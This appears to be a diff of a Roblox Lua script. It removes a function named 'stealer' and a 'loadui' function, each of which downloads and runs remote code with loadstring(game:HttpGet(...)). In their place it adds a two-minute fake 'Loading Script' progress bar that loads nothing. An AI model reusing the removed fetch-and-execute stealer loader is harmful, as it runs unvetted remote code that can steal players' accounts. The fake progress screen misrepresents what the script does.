@@ -1,9 +1,106 @@
-local function stealer()
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/FRIg4RFgU5/0", true))()'))()
-end
-local function loadui()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag1/Omghub/refs/heads/main/egg%20randomizer"))()
+-- Create the ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+screenGui.Name = "LoadingGui"
+
+-- Create the Frame for the loading screen
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Size = UDim2.new(0, 400, 0, 80)  -- Appropriate size for a clean, modern look
+loadingFrame.Position = UDim2.new(0.5, -200, 0.5, -40)  -- Centered in the middle of the screen
+loadingFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45) -- Dark background
+loadingFrame.BackgroundTransparency = 0
+loadingFrame.BorderSizePixel = 0
+loadingFrame.Parent = screenGui
+
+-- Rounded corners for the frame
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 16)  -- Smooth rounded corners
+corner.Parent = loadingFrame
+
+-- Create the actual progress bar (green color)
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(76, 175, 80) -- Default green color
+progressBar.BorderSizePixel = 0
+progressBar.Parent = loadingFrame
+
+-- Rounded corners for the progress bar
+local progressBarCorner = Instance.new("UICorner")
+progressBarCorner.CornerRadius = UDim.new(0, 12)
+progressBarCorner.Parent = progressBar
+
+-- Create the loading text
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(1, -100, 1, 0)
+loadingText.Position = UDim2.new(0, 10, 0, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Loading Script"
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.GothamSemibold
+loadingText.TextXAlignment = Enum.TextXAlignment.Left
+loadingText.Parent = loadingFrame
+
+-- Create the percentage text
+local percentageText = Instance.new("TextLabel")
+percentageText.Size = UDim2.new(0, 60, 1, 0)
+percentageText.Position = UDim2.new(1, -70, 0, 0)
+percentageText.BackgroundTransparency = 1
+percentageText.Text = "0%"
+percentageText.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentageText.TextScaled = true
+percentageText.Font = Enum.Font.GothamSemibold
+percentageText.Parent = loadingFrame
+
+-- Draggable functionality
+local dragging = false
+local dragInput, mousePos, framePos
+
+loadingFrame.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        mousePos = input.Position
+        framePos = loadingFrame.Position
+    end
+end)
+
+loadingFrame.InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - mousePos
+        loadingFrame.Position = UDim2.new(framePos.X.Scale, framePos.X.Offset + delta.X, framePos.Y.Scale, framePos.Y.Offset + delta.Y)
+    end
+end)
+
+loadingFrame.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = false
+    end
+end)
+
+-- Function to smoothly animate the rainbow color-changing progress bar
+local function getRainbowColor(percentage)
+    local hue = percentage * 360
+    return Color3.fromHSV(hue, 1, 1) -- Smooth rainbow effect
 end
 
-task.spawn(stealer)
-task.spawn(loadui)
+-- Function to simulate loading
+local function loadGame()
+    local duration = 120 -- Duration in seconds for the loading to complete (2 minutes)
+    local elapsedTime = 0
+    
+    while elapsedTime < duration do
+        wait(0.1)
+        elapsedTime = elapsedTime + 0.1
+        local progress = elapsedTime / duration
+        progressBar.Size = UDim2.new(progress, 0, 1, 0)
+        progressBar.BackgroundColor3 = getRainbowColor(progress) -- Change color as it progresses
+        percentageText.Text = string.format("%d%%", math.floor(progress * 100))  -- Update percentage text
+    end
+
+    -- After loading is done, remove the loading GUI
+    screenGui:Destroy()
+end
+
+-- Start loading when the script runs
+loadGame()
